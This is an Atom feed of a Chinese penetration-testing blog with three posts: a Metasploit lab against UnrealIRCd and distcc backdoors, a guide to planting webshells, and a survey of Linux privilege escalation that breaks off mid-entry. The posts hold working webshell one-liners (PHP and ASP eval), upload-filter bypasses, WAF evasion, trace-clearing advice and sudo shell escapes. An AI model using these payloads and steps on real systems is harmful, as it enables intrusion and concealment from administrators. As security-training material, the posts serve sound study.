<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Shu1L&#39;s blog</title>
  
  <subtitle>一只菜鸟白帽子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://shu1l.github.io/"/>
  <updated>2020-06-05T10:03:57.967Z</updated>
  <id>https://shu1l.github.io/</id>
  
  <author>
    <name>Shu1L</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>经典漏洞msf攻击实验记录</title>
    <link href="https://shu1l.github.io/2020/04/30/msf-gong-ji-shi-yan-ji-lu/"/>
    <id>https://shu1l.github.io/2020/04/30/msf-gong-ji-shi-yan-ji-lu/</id>
    <published>2020-04-30T07:54:24.000Z</published>
    <updated>2020-06-05T10:03:57.967Z</updated>
    
    <content type="html"><![CDATA[<h2 id="经典漏洞MSF攻击实验记录"><a href="#经典漏洞MSF攻击实验记录" class="headerlink" title="经典漏洞MSF攻击实验记录"></a>经典漏洞MSF攻击实验记录</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章记录一些自己使用msf进行的一些实验。</p><h3 id="msf利用UnrealIRCd后门漏洞攻击"><a href="#msf利用UnrealIRCd后门漏洞攻击" class="headerlink" title="msf利用UnrealIRCd后门漏洞攻击"></a>msf利用UnrealIRCd后门漏洞攻击</h3><p><strong>攻击主机：</strong>Kali linux, IP地址：192.168.153.176</p><p><strong>漏洞主机：</strong>linux   IP地址：192.168.153.131</p><h4 id="nmap扫描开放端口"><a href="#nmap扫描开放端口" class="headerlink" title="nmap扫描开放端口"></a>nmap扫描开放端口</h4><p> 利用命令： nmap -sT -v 10.1.1.136 扫描漏洞主机开放端口信息,扫描结果如下</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -v <span class="number">192.168</span><span class="number">.153</span><span class="number">.131</span></span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200429210327.png" alt=""></p><h4 id="UnrealIRCd后门漏洞简介"><a href="#UnrealIRCd后门漏洞简介" class="headerlink" title="UnrealIRCd后门漏洞简介"></a>UnrealIRCd后门漏洞简介</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CVE：CVE<span class="number">-2010</span><span class="number">-2075</span></span><br><span class="line"></span><br><span class="line">BID：BID<span class="number">-40820</span></span><br><span class="line"></span><br><span class="line">OSVDB：OSVDB<span class="number">-65445</span></span><br></pre></td></tr></table></figure><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>​        在2009年11月到2010年6月间分布于某些镜面站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码，影响系统/软件 Unreal UnrealIRCd 3.2.8.1。</p><h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><h5 id="1-分析可以利用的漏洞"><a href="#1-分析可以利用的漏洞" class="headerlink" title="1.分析可以利用的漏洞"></a>1.分析可以利用的漏洞</h5><p>根据Nmap扫描结果可知，6667号端口开放IRC服务，可以利用UnrealIRCD IRC软件的漏洞来攻击漏洞主机</p><h5 id="2-开启Msfconsole"><a href="#2-开启Msfconsole" class="headerlink" title="2. 开启Msfconsole"></a>2. 开启Msfconsole</h5><p>运行“msfconsole”命令开启msf</p><h5 id="3-搜索漏洞利用EXP"><a href="#3-搜索漏洞利用EXP" class="headerlink" title="3. 搜索漏洞利用EXP"></a>3. 搜索漏洞利用EXP</h5><p> 运行</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">search unrealircd</span></span><br></pre></td></tr></table></figure><p>命令搜索关于UnrealIRCD漏洞的利用信息</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429210558.png" alt=""></p><h5 id="设置漏洞利用exp"><a href="#设置漏洞利用exp" class="headerlink" title="设置漏洞利用exp"></a>设置漏洞利用exp</h5><p>使用’show options’ 命令查看该exploit的参数设置信息，发现执行该EXP前可以配置漏洞主机的IP和端口</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429211137.png" alt=""></p><h5 id="执行查看结果"><a href="#执行查看结果" class="headerlink" title="执行查看结果"></a>执行查看结果</h5><p>运行linux系统命令“whoami”，回显“root”说明当前shell的权限是root权限，可进行任意操作而不受权限控制，</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429211204.png" alt=""></p><h3 id="利用Distcc后门漏洞攻击"><a href="#利用Distcc后门漏洞攻击" class="headerlink" title="利用Distcc后门漏洞攻击"></a>利用Distcc后门漏洞攻击</h3><h4 id="Distcc后门漏洞"><a href="#Distcc后门漏洞" class="headerlink" title="Distcc后门漏洞"></a>Distcc后门漏洞</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安全组织索引</span><br><span class="line">CVE：CVE<span class="number">-2004</span><span class="number">-2687</span></span><br><span class="line">BID：无</span><br><span class="line">OSVDB：OSVDB<span class="number">-13378</span></span><br></pre></td></tr></table></figure><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><pre><code>Distcc用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是XCode 1.5版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制，影响系统 distcc 2.x</code></pre><h4 id="攻击过程-1"><a href="#攻击过程-1" class="headerlink" title="攻击过程"></a>攻击过程</h4><ol><li><h5 id="开启Msfconsole"><a href="#开启Msfconsole" class="headerlink" title="开启Msfconsole"></a>开启Msfconsole</h5><p>运行<code>msfconsole</code>命令开启msf</p></li><li><h5 id="搜索漏洞利用EXP"><a href="#搜索漏洞利用EXP" class="headerlink" title="搜索漏洞利用EXP"></a>搜索漏洞利用EXP</h5><p>运行<code>search distcc</code>命令搜索关于Distcc_exec 漏洞的利用信息</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429211425.png" alt=""></p></li></ol><ol start="3"><li><h5 id="运行漏洞利用EXP"><a href="#运行漏洞利用EXP" class="headerlink" title="运行漏洞利用EXP"></a>运行漏洞利用EXP</h5><p>运行<code>use exploit/unix/misc/distcc_exec</code>命令开始运行EXP</p></li></ol><p><img src="QQ%E6%88%AA%E5%9B%BE20200429211846.png" alt=""></p><p>设置漏洞主机IP</p><p>运行<code>set RHOST 10.1.1.136</code>命令设置漏洞主机IP</p><p>运行<code>exploit</code>命令，成功建立shell回话</p><h5 id="6-验证shell权限"><a href="#6-验证shell权限" class="headerlink" title="6.验证shell权限"></a>6.验证shell权限</h5><p>运行linux系统命令“whoami”，回显“root”说明当前shell的权限是root权限，可进行任意操作而不受权限控制.</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429212150.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;经典漏洞MSF攻击实验记录&quot;&gt;&lt;a href=&quot;#经典漏洞MSF攻击实验记录&quot; class=&quot;headerlink&quot; title=&quot;经典漏洞MSF攻击实验记录&quot;&gt;&lt;/a&gt;经典漏洞MSF攻击实验记录&lt;/h2&gt;&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; cla
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="msf" scheme="https://shu1l.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>拿WebShell 方法</title>
    <link href="https://shu1l.github.io/2020/04/30/na-webshell-fang-fa/"/>
    <id>https://shu1l.github.io/2020/04/30/na-webshell-fang-fa/</id>
    <published>2020-04-30T02:00:12.529Z</published>
    <updated>2020-06-05T10:05:00.433Z</updated>
    
    <content type="html"><![CDATA[<h2 id="拿WebShell-方法"><a href="#拿WebShell-方法" class="headerlink" title="拿WebShell 方法"></a>拿WebShell 方法</h2><h3 id="拿WebShell-的两种类型"><a href="#拿WebShell-的两种类型" class="headerlink" title="拿WebShell 的两种类型"></a>拿WebShell 的两种类型</h3><ul><li>管理权限拿WebShell （可以理解为进后台拿WebShell）</li><li>普通权限拿WebShell（可以理解为不进后台拿WebShell）</li></ul><p>下面附一张拿WebShell的思维导图，图如下：</p><p> <img src="https://img-blog.csdnimg.cn/20190816232239336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" alt="img"></p><h4 id="管理权限拿WebShell-常见的方法归纳为14种："><a href="#管理权限拿WebShell-常见的方法归纳为14种：" class="headerlink" title="管理权限拿WebShell 常见的方法归纳为14种："></a>管理权限拿WebShell 常见的方法归纳为14种：</h4><h5 id="1、正常上传"><a href="#1、正常上传" class="headerlink" title="1、正常上传"></a>1、正常上传</h5><ul><li><p>网站对上传文件后缀格式并未过滤，直接上传WebShell即可</p><p>大概思路是，已知后台管理员账号和密码，找有上传节点的地方，写一个隐蔽或变形的木马上传，上传成功后，用菜刀或蚁剑连接。</p><p> 注：为什么要写一个隐蔽或变形的木马呢？因为如果你用的常见的木马，只要一上传就会被管理员或WAF发现（常见的木马WAF都是有收集的，所以可以写完木马之后用D盾检查一下，被WAF检测出来的危险等级是多少）</p></li></ul><h5 id="2、数据库备份拿WebShell"><a href="#2、数据库备份拿WebShell" class="headerlink" title="2、数据库备份拿WebShell"></a>2、数据库备份拿WebShell</h5><p>​        网站对上传的文件后缀进行过滤，不允许上传脚本类型文件如 asp、php、jsp、aspx等。而网站具有数据库备份功能，这时我们就可以将WebShell格式先改为允许上传的文件格式，然后，我们找到上传后的文件路径，通过数据库备份，将文件备份为脚本格式。</p><p>注：</p><ul><li>1）有些备份数据库的地方，限制了用户更改路径，那该怎么办？</li></ul><p>F12打开开发者工具，修改文本框元素的value值为我们想要的路径或格式就可以完成修改</p><ul><li><p>如果上传的格式被限制呢？该怎么办？</p><p>可以使用%00截断来绕过上传限制或使用BurpSuite 工具（%00截断、特殊名文件名绕过、文件名大小写绕过等等黑白名单绕过，</p></li></ul><h5 id="3、本地js验证突破拿WebShell"><a href="#3、本地js验证突破拿WebShell" class="headerlink" title="3、本地js验证突破拿WebShell"></a><strong>3、本地js验证突破拿WebShell</strong></h5><p> 当网站设置了js来限制用户上传的文件类型时，可以通过删除js验证或者修改上传类型突破上传拿WebShell。</p><p>   使用BurpSuite 或者是 Fiddle等代理工具提交，本地文件先更改为jpg，上传时拦截，再把文件扩展名更改为asp或者php即可</p><h5 id="4、上传其它脚本类型拿WebShell"><a href="#4、上传其它脚本类型拿WebShell" class="headerlink" title="4、上传其它脚本类型拿WebShell"></a><strong>4、上传其它脚本类型拿WebShell</strong></h5><ul><li>此类型用于一台服务器具有多个网站，a网站是asp的站，b可能是php的站，而a站中限制了上传文件类型为asp的文件，你可以尝试上传php的脚本，来拿Shell</li></ul><ul><li>你也可以尝试将脚本文件后缀名改为asa 或者在后面直接加个点（.）如”xx.asp.” 来突破文件类型限制进行上传拿WebShell</li></ul><h5 id="5、-00截断拿WebShell"><a href="#5、-00截断拿WebShell" class="headerlink" title="5、%00截断拿WebShell"></a><strong>5、%00截断拿WebShell</strong></h5><ul><li>在上传文件的时候，你上传的文件名可能会被网站自动改成别的名字，这个时候你可以尝试抓取上传文件数据包，将文件名改为xx.asp%00.jpg进行截断上传，拿WebShell</li></ul><h5 id="6、利用解析漏洞拿WebShell"><a href="#6、利用解析漏洞拿WebShell" class="headerlink" title="6、利用解析漏洞拿WebShell"></a><strong>6、利用解析漏洞拿WebShell</strong></h5><ul><li>IIS5.x / 6.0 解析漏洞</li><li>IIS 7.0 / IIS 7.5 / Nginx &lt;8.03 畸形解析漏洞</li><li>Nginx &lt; 8.03 空字节代码执行漏洞</li><li>Apache 解析漏洞</li></ul><h5 id="7、利用编辑器漏洞拿WebShell"><a href="#7、利用编辑器漏洞拿WebShell" class="headerlink" title="7、利用编辑器漏洞拿WebShell"></a><strong>7、利用编辑器漏洞拿WebShell</strong></h5><p>​         利用网站的编辑器上传木马，搜索已知的编辑器漏洞，常见的编辑器有 fckeditor、ewebeditor、cheditor等，有时候没有管理员权限也可以拿下webshell。</p><h5 id="8、网站配置插马拿WebShell"><a href="#8、网站配置插马拿WebShell" class="headerlink" title="8、网站配置插马拿WebShell"></a><strong>8、网站配置插马拿WebShell</strong></h5><p>​            通过找到网站默认配置，将一句话插入到网站配置中，不过为了能够成功执行插马，建议先下载该站源码，进行查看源码过滤规则，以防插马失败。</p><p>PS：插马失败很有可能会导致网站被你写的一句话木马，没有闭合标签导致被网站被插废。</p><p> <code>&quot;%&gt;&lt;%eval request(&quot;cracer&quot;)%&gt;&lt;%&#39;</code><br>            注意：我这里构造的是下载了程序的源码，然后在config.asp文件里的代码来修改的。不同的版本的网站源码都不一样，实际问题实际分析，在此就不做多的解释了。这里最后的单引号（’）是注释当前行后面所有的内容。</p><h5 id="9、通过编辑模块拿WebShell"><a href="#9、通过编辑模块拿WebShell" class="headerlink" title="9、通过编辑模块拿WebShell"></a><strong>9、通过编辑模块拿WebShell</strong></h5><ul><li>通过对网站的模块进行编辑写入一句话，然后生成脚本文件拿WebShell</li><li>通过将木马添加到压缩文件，把名字改为网站模板类型，上传到网站服务器，拿WebShell</li></ul><h5 id="10、修改脚本直接拿WebShell"><a href="#10、修改脚本直接拿WebShell" class="headerlink" title="10、修改脚本直接拿WebShell"></a><strong>10、修改脚本直接拿WebShell</strong></h5><p> 有的网站可以修改添加脚本文件，可以直接拿WebShell</p><p>注：织梦的后台，大家可以下个织梦后台网站源码，复现一下</p><h5 id="11、数据库命令执行拿WebShell"><a href="#11、数据库命令执行拿WebShell" class="headerlink" title="11、数据库命令执行拿WebShell"></a>11、数据库命令执行拿WebShell</h5><p>可以通过phpmyadmin 登录数据库使用数据库命令来写如一句话拿WebShell</p><p><strong>大致步骤：</strong></p><ul><li>创建表</li><li>将一句话写入刚创建的表中</li><li>查询一句话所在表到文件，成功将一句话写入文件</li><li>注：这个前提条件是需要有一定的数据库权限</li></ul><h5 id="12、上传特殊木马拿WebShell"><a href="#12、上传特殊木马拿WebShell" class="headerlink" title="12、上传特殊木马拿WebShell"></a>12、上传特殊木马拿WebShell</h5><p>一些网站安装了WAF 安全狗、360，我们可以通过上传一些免杀马，变形木马来进行突破封杀</p><h5 id="13、文件包含拿WebShell"><a href="#13、文件包含拿WebShell" class="headerlink" title="13、文件包含拿WebShell"></a>13、文件包含拿WebShell</h5><p>先将WebShell 改为txt格式文件上传，然后上传一个脚本文件包含该txt格式文件，可绕过WAF拿WebShell</p><p>   ASP 包含：</p><p><code>&lt;!--#include file = &quot;1.jpg&quot;--&gt;</code></p><ol start="2"><li><p>调用的文件必须和被调用文件在同一目录，否则找不到</p></li><li><p>如果不在同一目录，用下面的语句：</p><p> <code>&lt;!--#include virtual=&quot;文件所在目录/1.jpg&quot;--&gt;</code><br>  PHP 包含：</p></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">   <span class="keyword">include</span>(<span class="string">'1.jpg'</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>注：这种情况一般是，我们已经通过菜刀拿下了权限了，假设菜刀一句话木马可以过安全狗，但大马却怎么都没有上传成功，绕过安全狗</p><p>解决发现大马上传不了，被防火墙或者安全狗拦截时，可以考虑使用包含文件</p><p>思路如下：</p><pre><code> 1）先上传一个含有包含代码（如&lt;!-- #include file=&quot;x.jpg&quot; --&gt;）却没有攻击代码的文件，不会被狗拦 2）再将大马改成jpg图片文件上传，也不会被狗拦 3）访问第一次上传的包含函数的文件，会发现执行了木马 4）这里是因为包含函数包含的文件会被当成脚本文件，直接将文件内容插入到这个文件中这是因为包含函数包含的文件会被当成脚本文件，直接将文件内容插入到这个文件中</code></pre><h5 id="14、另类拿WebShell"><a href="#14、另类拿WebShell" class="headerlink" title="14、另类拿WebShell"></a>14、另类拿WebShell</h5><ul><li><p>更新页面拿Shell</p><ul><li>在网站模板中的404页面中插入一句话木马，之后找到这个页面的绝对路径，访问之即可拿Shell</li></ul></li><li><p>上传插件拿Shell</p><ul><li>将木马放入zip压缩文件中，最好是网站插件的压缩文件，之后再后台安装插件，选中含有木马的压缩文件，会自动将插件连通木马安装在网站目录下，接下来我们只需要寻找到木马的绝对路径即可</li></ul></li><li><p>上传特殊马拿WebShell</p></li><li><p>还有一种就是我们之前说那种通过上传一些免杀马，变形木马来进行突破封杀</p></li></ul><h4 id="普通权限拿WebShell-常见的方法归纳为7种："><a href="#普通权限拿WebShell-常见的方法归纳为7种：" class="headerlink" title="普通权限拿WebShell 常见的方法归纳为7种："></a>普通权限拿WebShell 常见的方法归纳为7种：</h4><p>普通权限拿WebShell 是啥？</p><pre><code>可以理解为不进后台拿WebShell</code></pre><p>常见方法归纳为六种：</p><h5 id="1、0day-拿WebShell"><a href="#1、0day-拿WebShell" class="headerlink" title="1、0day 拿WebShell"></a>1、0day 拿WebShell</h5><p>​    网上有很多理论知识,自己搜索CMS是discz的相关oday，看看能不能复现</p><h5 id="2、修改网站上传类型配置来拿WebShell"><a href="#2、修改网站上传类型配置来拿WebShell" class="headerlink" title="2、修改网站上传类型配置来拿WebShell"></a>2、修改网站上传类型配置来拿WebShell</h5><p>​    某些网站，在网站上传类型中限制了上传脚本类型文件，我们可以去添加上传文件类型如添加asp | php | jsp | aspx | asa 后缀名来拿WebShell</p><h5 id="3、xss和sql注入联合利用"><a href="#3、xss和sql注入联合利用" class="headerlink" title="3、xss和sql注入联合利用"></a>3、xss和sql注入联合利用</h5><p>​        有些输入框对一些符号过滤不严密（如&lt;&gt;，所以一般存在xss的地方就可以这么利用）我们可以在这里输入一句话<?php @eval($_POST['CE']);?>之后再用数据库注入，查询到文件into file成功插入一句话木马</p><h5 id="4、IIS写权限拿WebShell"><a href="#4、IIS写权限拿WebShell" class="headerlink" title="4、IIS写权限拿WebShell"></a>4、IIS写权限拿WebShell</h5><p>​            有些网站的管理员在配置网站权限的时候疏忽，导致我们有写权限，这种漏洞需要用工具来利用，在这里就不说了，只是提一下。而且已经很少见了，有专门的利用工具（桂林老兵），原理是通过找到有IIS 写入权限的网站（开启WebDeV），PUT进去一个.txt 格式的文件，目录必须有刻写的权限，如 image 文件夹，然后通过move 方法，把txt 格式的木马用move 成脚本格式。</p><pre><code>例如：一开始上传的是test.txt    move 成 test1.asp</code></pre><h5 id="5、远程命令执行拿WebShell"><a href="#5、远程命令执行拿WebShell" class="headerlink" title="5、远程命令执行拿WebShell"></a>5、远程命令执行拿WebShell</h5><p>   执行命令行命令“写入内容到文件<strong>“<code>echo ?php</code>“<code>@eval($_POST[</code>‘cmd’<code>]);?&gt;</code>“<code>&gt; x.php</code></strong> 会自动将创建木马文件并将一句话木马写入其中，使用菜刀连接即可。</p><h5 id="6、头像上传拿WebShell"><a href="#6、头像上传拿WebShell" class="headerlink" title="6、头像上传拿WebShell"></a><strong>6、头像上传拿WebShell</strong></h5><p>用户注册后有些网站可以上传图片、附件、文件、压缩包等，可以利用上传拿WebShell</p><p>大概思路：</p><ul><li>将大马放在文件夹中</li><li>将文件夹压缩成压缩文件（zip）</li><li>正常上传一个头像并且抓包</li><li>将数据包中图片头像的内容部分删掉</li><li>重新写入文件内容，将压缩文件写入到原本图片的位置</li><li>上传<br>之后返回包中会告诉我们绝对路径</li></ul><h5 id="7、SQL注入漏洞拿WebShell"><a href="#7、SQL注入漏洞拿WebShell" class="headerlink" title="7、SQL注入漏洞拿WebShell"></a>7、SQL注入漏洞拿WebShell</h5><ol><li>前提条件，具有足够权限，对写入木马的文件夹有写入权限，知道网站绝对路径</li><li>对于MsSQL 注入漏洞网站可以通过log 备份、差异备份拿WebShell</li><li>对于MySQL 注入漏洞的网站可以通过into outfile 函数(写入函数)将一句话木马写入，拿WebShell。 还有一个是into file 函数（读取函数）<ul><li>要有file_priv权限</li><li>知道文件绝对路径</li><li>能使用union</li><li>对web目录有读权限<br>注：若过滤了单引号，则可以将函数中的字符进行hex编码</li></ul></li></ol><p>into outfile 函数类似</p><pre><code>4）利用phpmyadmin 将木马导出，拿WebShell5）利用连接拿WebShell</code></pre><h5 id="什么是外连接？"><a href="#什么是外连接？" class="headerlink" title="什么是外连接？"></a>什么是外连接？</h5><p>​        数据库有内连接、外连接来组合条件适用，外连接分为左连接和右连接。这里我们可以使用外连接来获取WebShell.</p><ul><li>内连接：指连接结果仅包含符合连接条件的行，参与连接的两个表都应该符合连接条件。</li><li>外连接：连接结果不仅包含符合连接条件的行同时也包含自身不符合条件的行。包括左外连接、右外连接和全外连接。</li></ul><p>1、内连接</p><p>​    内连接，即最常见的等值连接</p><p>例:</p><pre><code>SELECT * FROM TESTA,TESTBWHERE TESTA.A=TESTB.A</code></pre><p>2、外连接</p><pre><code>外连接分为左外连接，右外连接和全外连接。左外连接 left outer join 或者 left join左外连接就是在等值连接的基础上加上主表中的未匹配数据</code></pre><p>例:</p><pre><code>SELECT *FROM TESTA LEFT OUTER JOIN TESTB ON TESTA.A=TESTB.A </code></pre><p>拓展内容：</p><pre><code>全外连接 full outer join 或者 full join全外连接是在等值连接的基础上将左表和右表的未匹配数据都加上。</code></pre><p>例：</p><pre><code>SELECT * FROM TESTA FULL OUTER JOIN TESTBON TESTA.A=TESTB.A</code></pre><p>结果:外连接内容参考链接：<a href="https://zhidao.baidu.com/question/338244729.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/338244729.html</a></p><p>大概思路：</p><ol><li>创建表</li><li>将一句话写入刚创建的表中</li><li>查询一句话所在表到文件，成功将一句话写入文件</li><li>导出木马到某个路径下</li><li>删除刚刚创建的表（这一步是为了清楚痕迹，在一定程度上可以预防我们被管理员发现）</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;拿WebShell-方法&quot;&gt;&lt;a href=&quot;#拿WebShell-方法&quot; class=&quot;headerlink&quot; title=&quot;拿WebShell 方法&quot;&gt;&lt;/a&gt;拿WebShell 方法&lt;/h2&gt;&lt;h3 id=&quot;拿WebShell-的两种类型&quot;&gt;&lt;a href=
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>linux提权综述</title>
    <link href="https://shu1l.github.io/2020/04/29/linux-ti-quan-zong-shu/"/>
    <id>https://shu1l.github.io/2020/04/29/linux-ti-quan-zong-shu/</id>
    <published>2020-04-29T06:01:07.000Z</published>
    <updated>2020-06-05T10:09:15.585Z</updated>
    
    <content type="html"><![CDATA[<h2 id="linux提权方法综述"><a href="#linux提权方法综述" class="headerlink" title="linux提权方法综述"></a>linux提权方法综述</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h3 id="提权方式总结"><a href="#提权方式总结" class="headerlink" title="提权方式总结"></a><strong>提权方式总结</strong></h3><h4 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h4><p>​        当我们渗透时获得一个低权限的shell时，内核漏洞应该是最先想到的提权方法。比如前几年很流行的”脏牛漏洞“，直接利用系统里面自带的软件或者内核存在的漏洞。</p><p>，要判断我们应该先对系统相关的信息进行收集。</p><h5 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h5><ul><li>已经拿到低权限shell</li><li>目标系统上有gcc</li><li>有上传文件的权限</li></ul><p><strong>使用命令</strong>：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -<span class="keyword">a</span>  或  uname -r</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200429143857.png" alt=""></p><p>这样，我们就得到了系统的内核版，cpu架构，和发行版等信息</p><p>然后我们就可以使用kali自带的searchsploit来搜索利用代码。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429144304.png" alt=""></p><p>这里在推荐一个很好用的工具</p><h5 id="Linux-Exploit-Suggester"><a href="#Linux-Exploit-Suggester" class="headerlink" title="Linux Exploit Suggester"></a>Linux Exploit Suggester</h5><p>​    linux exploit_Suggester是一款根据操作系统版本号自动查找相应<a href="https://www.webshell.cc/tag/tiquan" target="_blank" rel="noopener">提权</a>脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p><p>下载地址：<a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" target="_blank" rel="noopener">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></p><p>举个例子：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ perl ./Linux_Exploit_Suggester.pl -k <span class="number">3.0</span><span class="number">.0</span></span><br><span class="line"> </span><br><span class="line">Kernel local: <span class="number">3.0</span><span class="number">.0</span></span><br><span class="line"> </span><br><span class="line">Possible Exploits:</span><br><span class="line">[+] semtex</span><br><span class="line">   CVE<span class="number">-2013</span><span class="number">-2094</span></span><br><span class="line">   Source: www.exploit-db.com/download/<span class="number">25444</span>/‎</span><br><span class="line">[+] memodipper</span><br><span class="line">   CVE<span class="number">-2012</span><span class="number">-0056</span></span><br><span class="line">   Source: http:<span class="comment">//www.exploit-db.com/exploits/18411/</span></span><br><span class="line">[+] perf_swevent</span><br><span class="line">   CVE<span class="number">-2013</span><span class="number">-2094</span></span><br><span class="line">   Source: http:<span class="comment">//www.exploit-db.com/download/26131</span></span><br></pre></td></tr></table></figure><h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><ul><li>找到具备利用条件的exp</li><li>上传源代码</li><li>编译exp后执行</li></ul><h5 id="脏牛漏洞"><a href="#脏牛漏洞" class="headerlink" title="脏牛漏洞"></a>脏牛漏洞</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">漏洞描述：</span><br><span class="line">漏洞编号：CVE<span class="number">-2016</span><span class="number">-5195</span></span><br><span class="line">漏洞名称：脏牛（Dirty COW）</span><br><span class="line">漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权</span><br><span class="line">影响范围：Linux kernel &gt;=<span class="number">2.6</span><span class="number">.22</span> 并且Android也受影响</span><br></pre></td></tr></table></figure><h4 id="明文-root-密码提权"><a href="#明文-root-密码提权" class="headerlink" title="明文 root 密码提权"></a>明文 root 密码提权</h4><p>情况极少。。。。</p><p>passwd 储存了用户，全用户可读，root 可写 shadow 存储密码的 hash，仅 root 可读写</p><p>passwd 文件：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429144854.png" alt=""></p><p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（这样非 root 就看不到了）。而 shadow 里面最重要的就是密码的 hash</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200430191351.png" alt=""></p><p>以非root用户打开，提示没有权限。</p><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>查看两个文件：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> -l <span class="string">/etc/passwd</span> <span class="string">/etc/shadow</span></span><br></pre></td></tr></table></figure><h5 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h5><ul><li>shadow中存储了用户的密码hash，但是如果passwd可写，将passwd中的x改为一个已知密码的hash，那么系统在验证密码时将以passwd的为准。</li><li>shadow可读的情况下，可以使用john或其他来进行暴力破解hash。</li></ul><h4 id="sudo-滥用"><a href="#sudo-滥用" class="headerlink" title="sudo 滥用"></a>sudo 滥用</h4><p>sudo 是一个linux经常用到的命令，比如执行权限不够时加 sudo 执行，sudo 是让普通用户使用超级用户的命令。其配置文件为 <strong>/etc/sudoers</strong>，文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。</p><p>查看可以执行哪些命令，即不需要知道 root 密码时，需验证自身普通权限的密码</p><p><code>sudo -l</code></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429163933.png" alt=""></p><p>可以支持所有命令，下面参考这个网址:</p><blockquote><p><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p></blockquote><p>这里以 awk、man 举例</p><p><strong>1、su</strong></p><blockquote><p>sudo su</p></blockquote><p>输入普通权限用户密码，切换为 root</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429164436.png" alt=""></p><p><strong>2、awk</strong></p><blockquote><p>sudo awk ‘BEGIN {system(“/bin/sh”)}’</p></blockquote><p><img src="QQ%E6%88%AA%E5%9B%BE20200429164548.png" 